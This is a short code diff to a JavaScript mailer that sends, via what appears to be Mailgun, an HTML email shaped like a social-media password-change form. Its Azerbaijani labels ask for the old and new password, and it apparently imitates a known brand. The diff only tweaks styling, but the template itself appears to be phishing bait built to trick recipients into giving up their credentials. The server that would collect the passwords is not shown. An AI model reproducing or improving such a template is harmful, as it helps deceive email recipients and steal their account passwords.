@@ -18,20 +18,15 @@ async function f() {
         html: "<link href=\"https://fonts.googleapis.com/css?family=Indie+Flower|Overpass+Mono\" rel=\"stylesheet\">\n" +
             "\n" +
             "<div id=\"wrapper\">\n" +
-            "  <div class=\"main-content\" style='display: flex;\n" +
-            "    justify-content: space-between;\n" +
-            "    width: 60%;\n" +
-            "    margin: .5rem;'>\n" +
+            "  <div class=\"main-content\" style=''>\n" +
             "    <div class=\"header\">\n" +
             "      <img src=\"https://i.imgur.com/zqpwkLQ.png\" />\n" +
             "    </div>\n" +
             "    <div class=\"l-part\">\n" +
             "<label for=\"pv\">Kohne Sifre</label>"+
             "      <input id='pv' type=\"password\" placeholder=\"Username\" class=\"input-1\" />\n" +
-            "      <div class=\"overlap-text\">\n" +
             "<label for=\"pv2\">Yeni Sifre</label>\n" +
             "<input type=\"password\" id='pv2' placeholder=\"Password\" class=\"input-2\" />\n" +
-            "      </div>\n" +
             "      <input type=\"button\" value=\"Deyis\" class=\"btn\" />\n" +
             "    </div>\n" +
             "  </div>\n" +
@@ -40,7 +35,7 @@ async function f() {
             "\n" +
             "\n" +
             "\n" +
-            "\n"
+            "\n";
     };
     mg.messages().send(data, function (error, body) {
         console.log(body);
